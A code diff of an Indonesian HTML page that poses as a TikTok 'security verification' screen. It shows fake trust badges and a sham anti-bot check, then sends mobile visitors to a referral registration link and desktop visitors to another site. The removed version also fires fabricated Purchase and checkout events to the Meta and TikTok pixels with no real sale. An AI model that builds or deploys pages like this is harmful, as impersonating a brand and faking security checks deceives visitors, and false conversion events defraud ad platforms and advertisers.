@@ -1,339 +1,303 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <!-- =========================
-       META PIXEL
-  ========================== -->
-  <script>
-  !function(f,b,e,v,n,t,s) {
-    if (f.fbq) return;
-    n = f.fbq = function() {
-      n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
-    };
-    if (!f._fbq) f._fbq = n;
-    n.push = n; n.loaded = true; n.version = "2.0"; n.queue = [];
-    t = b.createElement(e); t.async = true; t.src = v;
-    s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s);
-  }(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- CSS RESET & VARIABLES --- */
+        :root {
+            --bg-color: #f5f6f8;
+            --card-bg: #ffffff;
+            --text-main: #1a1a1a;
+            --text-sub: #6b7280;
+            --btn-bg: #111111;
+            --btn-hover: #333333;
+            --green-bg: #ecfdf5;
+            --green-text: #10b981;
+            --border-color: #e5e7eb;
+        }
 
-  fbq("init", "DASCJ93C77U5PB60BNTG", {
-    em: 'dGVzdEBnbWFpbC5jb20=',
-    ph: '2b1c2d3e4f5g6h7i8j9k0l='
-  });
-  fbq("track", "PageView");
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=DASCJ93C77U5PB60BNTG&ev=PageView&noscript=1" alt="" />
-  </noscript>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-  <!-- =========================
-       TIKTOK PIXEL
-  ========================== -->
-  <script>
-  !function (w, d, t) {
-    w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r;ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-    ttq.load('DASCJ93C77U5PB60BNTG');
-    ttq.identify({
-      email: 'dGVzdEBnbWFpbC5jb20=',
-      phone_number: '2b1c2d3e4f5g6h7i8j9k0l='
-    });
-    ttq.page();
-  }(window, document, 'ttq');
-  </script>
+        /* --- CARD UI --- */
+        .card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 40px 32px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04), 0 2px 10px rgba(0, 0, 0, 0.02);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
 
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <meta name="theme-color" content="#ffffff" />
-  <title>Verifikasi Keamanan</title>
+        /* --- LOGO --- */
+        .logo-wrapper {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .logo-wrapper svg {
+            width: 48px;
+            height: 48px;
+        }
 
-  <!-- Preload Font untuk kecepatan render -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+        /* --- TYPOGRAPHY --- */
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 12px;
+        }
 
-  <style>
-    /* ============================================================
-       CSS YANG SANGAT RINGAN & MODERN
-    ============================================================ */
-    :root {
-      --bg-body: #f9fafb;
-      --bg-card: #ffffff;
-      --text-main: #111827;
-      --text-muted: #6b7280;
-      --border-color: #e5e7eb;
-      --primary: #000000;
-      --primary-hover: #1f2937;
-      --success-bg: #ecfdf5;
-      --success-text: #047857;
-      --success-dot: #10b981;
-    }
+        p.subtitle {
+            font-size: 14px;
+            color: var(--text-sub);
+            line-height: 1.5;
+            margin-bottom: 24px;
+            padding: 0 10px;
+        }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+        /* --- BADGE --- */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            background-color: var(--green-bg);
+            color: var(--green-text);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 32px;
+            letter-spacing: 0.5px;
+        }
 
-    body {
-      min-height: 100svh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      background-color: var(--bg-body);
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      color: var(--text-main);
-      -webkit-font-smoothing: antialiased;
-    }
+        .badge .dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--green-text);
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
+            animation: pulse 2s infinite;
+        }
 
-    .card {
-      width: 100%;
-      max-width: 400px;
-      background: var(--bg-card);
-      border-radius: 20px;
-      padding: 40px 32px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
-      border: 1px solid var(--border-color);
-      text-align: center;
-      animation: fadeIn 0.4s ease-out;
-    }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
 
-    /* Logo TikTok */
-    .tiktok-logo {
-      width: 44px;
-      height: 44px;
-      margin: 0 auto 20px;
-      color: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        /* --- BUTTON --- */
+        .btn-verify {
+            width: 100%;
+            background-color: var(--btn-bg);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
 
-    .tiktok-logo svg {
-      width: 100%;
-      height: 100%;
-    }
+        .btn-verify:hover {
+            background-color: var(--btn-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
 
-    .title {
-      font-size: 22px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-      margin-bottom: 8px;
-      color: var(--text-main);
-    }
+        .btn-verify:active {
+            transform: translateY(1px);
+        }
 
-    .subtitle {
-      font-size: 14px;
-      line-height: 1.5;
-      color: var(--text-muted);
-      margin-bottom: 24px;
-    }
+        .btn-verify:disabled {
+            background-color: #4b5563;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-    .status-box {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 8px 16px;
-      background-color: var(--success-bg);
-      border-radius: 100px;
-      margin-bottom: 32px;
-    }
+        /* Spinner Animation */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+        }
 
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background-color: var(--success-dot);
-      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
-    }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-    .status-text {
-      font-size: 12px;
-      font-weight: 600;
-      color: var(--success-text);
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
+        /* --- FOOTER BADGES --- */
+        .footer-badges {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
 
-    .verify-button {
-      width: 100%;
-      padding: 16px 24px;
-      border-radius: 12px;
-      border: none;
-      background-color: var(--primary);
-      color: #ffffff;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: background-color 0.2s ease, transform 0.1s ease;
-    }
+        .footer-item {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+            color: var(--text-sub);
+            font-weight: 500;
+        }
 
-    .verify-button:hover { background-color: var(--primary-hover); }
-    .verify-button:active { transform: scale(0.98); }
-    .verify-button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+        .footer-item svg {
+            width: 14px;
+            height: 14px;
+            margin-right: 6px;
+            fill: currentColor;
+        }
 
-    .spinner {
-      display: none;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255, 255, 255, 0.3);
-      border-top-color: #ffffff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    .loading .spinner { display: block; }
-    .loading .btn-text { display: none; }
-
-    .trust-footer {
-      margin-top: 28px;
-      padding-top: 20px;
-      border-top: 1px solid var(--border-color);
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-    }
-
-    .trust-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 12px;
-      font-weight: 500;
-      color: var(--text-muted);
-    }
-
-    .trust-item svg { width: 14px; height: 14px; fill: var(--text-muted); }
-
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    @media (max-width: 400px) {
-      .card { padding: 32px 20px; border-radius: 16px; }
-      .title { font-size: 20px; }
-      .trust-footer { flex-direction: column; gap: 10px; }
-    }
-  </style>
+        /* --- RESPONSIVE --- */
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+                border-radius: 20px;
+            }
+            h1 { font-size: 20px; }
+            p.subtitle { font-size: 13px; }
+        }
+    </style>
 </head>
 <body>
 
-  <main class="card">
-    
-    <!-- LOGO TIKTOK DITAMBAHKAN DI SINI -->
-    <div class="tiktok-logo">
-      <svg viewBox="0 0 24 24" fill="currentColor">
-        <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
-      </svg>
+    <div class="card">
+        <!-- TikTok Logo SVG -->
+        <div class="logo-wrapper">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M19.589 6.686C18.013 5.644 17.07 3.929 17.07 2H13.95V15.838C13.95 17.5 12.602 18.848 10.94 18.848C9.278 18.848 7.93 17.5 7.93 15.838C7.93 14.176 9.278 12.828 10.94 12.828C11.324 12.828 11.69 12.901 12.031 13.031V9.817C11.68 9.734 11.318 9.688 10.94 9.688C7.55 9.688 4.79 12.448 4.79 15.838C4.79 19.228 7.55 21.988 10.94 21.988C14.33 21.988 17.09 19.228 17.09 15.838V8.858C18.32 9.726 19.82 10.233 21.45 10.233V7.113C20.74 7.113 20.09 6.959 19.589 6.686Z" fill="#111111"/>
+            </svg>
+        </div>
+
+        <h1>Verifikasi Keamanan</h1>
+        <p class="subtitle">Sistem mendeteksi koneksi aman. Silakan verifikasi untuk melanjutkan.</p>
+
+        <div class="badge">
+            <span class="dot"></span> KONEKSI AMAN
+        </div>
+
+        <!-- Tombol dengan Spinner -->
+        <button id="verifyBtn" class="btn-verify">
+            <span class="spinner" id="spinner"></span>
+            <span id="btnText">Verifikasi & Lanjutkan</span>
+        </button>
+
+        <div class="footer-badges">
+            <div class="footer-item">
+                <!-- Lock Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM15 8H9V6C9 4.34 10.34 3 12 3C13.66 3 15 4.34 15 6V8Z"/>
+                </svg>
+                SSL Terenkripsi
+            </div>
+            <div class="footer-item">
+                <!-- Shield Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z"/>
+                </svg>
+                Terverifikasi
+            </div>
+        </div>
     </div>
 
-    <h1 class="title">Verifikasi Keamanan</h1>
-    <p class="subtitle">Sistem mendeteksi koneksi aman. Silakan verifikasi untuk melanjutkan ke TikTok.</p>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- KONFIGURASI ANTI-BOT ---
+            const verifyBtn = document.getElementById('verifyBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            
+            let humanInteractionDetected = false;
+            const loadTime = Date.now();
 
-    <div class="status-box">
-      <span class="status-dot"></span>
-      <span class="status-text">Koneksi Aman</span>
-    </div>
+            // Deteksi pergerakan mouse (PC) atau sentuhan (Mobile)
+            window.addEventListener('mousemove', () => { humanInteractionDetected = true; }, { once: true });
+            window.addEventListener('touchstart', () => { humanInteractionDetected = true; }, { once: true });
 
-    <button class="verify-button" id="buyButton" type="button">
-      <span class="btn-text">Verifikasi &amp; Lanjutkan</span>
-      <span class="spinner" aria-hidden="true"></span>
-    </button>
+            // --- FUNGSI REDIRECT ---
+            const handleRedirect = () => {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-    <div class="trust-footer">
-      <div class="trust-item">
-        <svg viewBox="0 0 24 24"><path d="M12 2C9.243 2 7 4.243 7 7V10H6C4.897 10 4 10.897 4 12V20C4 21.103 4.897 22 6 22H18C19.103 22 20 21.103 20 20V12C20 10.897 19.103 10 18 10H17V7C17 4.243 14.757 2 12 2ZM12 4C13.654 4 15 5.346 15 7V10H9V7C9 5.346 10.346 4 12 4ZM12 14C13.103 14 14 14.897 14 16C14 17.103 13.103 18 12 18C10.897 18 10 17.103 10 16C10 14.897 10.897 14 12 14Z"/></svg>
-        <span>SSL Terenkripsi</span>
-      </div>
-      <div class="trust-item">
-        <svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/></svg>
-        <span>Terverifikasi</span>
-      </div>
-    </div>
+                // Deteksi Device
+                const isAndroid = /android/i.test(userAgent);
+                const isIOS = /iPad|iPhone|iPod/.test(userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
 
-  </main>
+                if (isAndroid || isIOS) {
+                    // Redirect jika Android atau iPhone (Mobile)
+                    window.location.href = 'https://pafimalang.org/register?referral=jonathannn';
+                } else {
+                    // Redirect jika PC / Desktop
+                    window.location.href = 'https://veyrendigitalagency.xyz/';
+                }
+            };
 
-  <!-- ============================================================
-       TRACKING + REDIRECT LOGIC (OPTIMIZED)
-  ============================================================ -->
-  <script>
-    (function() {
-      "use strict";
+            // --- EVENT CLICK TOMBOL ---
+            verifyBtn.addEventListener('click', () => {
+                // Cek 1: Apakah ada interaksi fisik (Anti-Bot)
+                if (!humanInteractionDetected) {
+                    alert("Sistem mendeteksi aktivitas mencurigakan. Silakan gerakkan mouse atau sentuh layar Anda.");
+                    return;
+                }
 
-      // 1. PENGATURAN UTAMA
-      const TUJUAN_URL = "https://pafimalang.org/register?referral=jonathannn";
-      const SHOPEE_URL = "https://shopee.com/"; // Ganti dengan link Shopee Anda
-      const productId = "VEYREN";
-      const price = 150000;
-      const currency = "IDR";
+                // Cek 2: Waktu di halaman (Anti-Bot - minimal 1.5 detik di halaman)
+                const timeOnPage = Date.now() - loadTime;
+                if (timeOnPage < 1500) {
+                    alert("Verifikasi terlalu cepat. Silakan coba lagi.");
+                    return;
+                }
 
-      // 2. DETEKSI DEVICE (Lebih ringkas & modern)
-      const isMobileDevice = () => {
-        const ua = navigator.userAgent || navigator.vendor || window.opera;
-        return /android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua) 
-               || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-      };
+                // Tampilkan Loading State
+                verifyBtn.disabled = true;
+                btnText.textContent = "Memverifikasi...";
+                spinner.style.display = "block";
 
-      const FINAL_URL = isMobileDevice() ? TUJUAN_URL : SHOPEE_URL;
-
-      // 3. LOGIKA PELACAKAN
-      const button = document.getElementById("buyButton");
-      const eventId = 'evt_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-
-      // Tembak ViewContent saat halaman dimuat
-      window.addEventListener('load', () => {
-        if (typeof window.fbq === "function") {
-          window.fbq('track', 'ViewContent', {
-            content_ids: [productId], content_type: 'product', value: price, currency: currency
-          }, { eventID: eventId + '_view' });
-        }
-        if (window.ttq && typeof window.ttq.track === "function") {
-          window.ttq.track('ViewContent', {
-            content_id: productId, content_type: 'product', value: price, currency: currency
-          }, { event_id: eventId + '_view' });
-        }
-      });
-
-      // Aksi saat tombol diklik
-      button.addEventListener("click", () => {
-        button.disabled = true;
-        button.classList.add("loading");
-
-        // Tembak AddToCart
-        if (typeof window.fbq === "function") {
-          window.fbq('track', 'AddToCart', { content_ids: [productId], value: price, currency: currency }, { eventID: eventId + '_atc' });
-        }
-        if (window.ttq) {
-          window.ttq.track('AddToCart', { content_id: productId, value: price, currency: currency }, { event_id: eventId + '_atc' });
-        }
-
-        setTimeout(() => {
-          if (typeof window.fbq === "function") {
-            window.fbq('track', 'InitiateCheckout', { content_ids: [productId], value: price, currency: currency }, { eventID: eventId + '_ic' });
-          }
-          if (window.ttq) {
-            window.ttq.track('InitiateCheckout', { content_id: productId, value: price, currency: currency }, { event_id: eventId + '_ic' });
-          }
-
-          setTimeout(() => {
-            if (typeof window.fbq === "function") {
-              window.fbq('track', 'Purchase', { content_ids: [productId], value: price, currency: currency }, { eventID: eventId + '_pur' });
-            }
-            if (window.ttq) {
-              window.ttq.track('CompletePayment', { content_id: productId, value: price, currency: currency }, { event_id: eventId + '_pur' });
-            }
-
-            // Redirect (Gunakan assign untuk memastikan redirect berjalan di mobile)
-            setTimeout(() => {
-              window.location.assign(FINAL_URL);
-            }, 1200); // Dikurangi sedikit agar tidak terlalu lama menunggu
-
-          }, 400);
-        }, 400);
-      });
-
-    })();
-  </script>
+                // Simulasi proses verifikasi keamanan (1.5 detik)
+                setTimeout(() => {
+                    btnText.textContent = "Mengalihkan...";
+                    // Eksekusi redirect
+                    handleRedirect();
+                }, 1500);
+            });
+        });
+    </script>
 </body>
 </html>
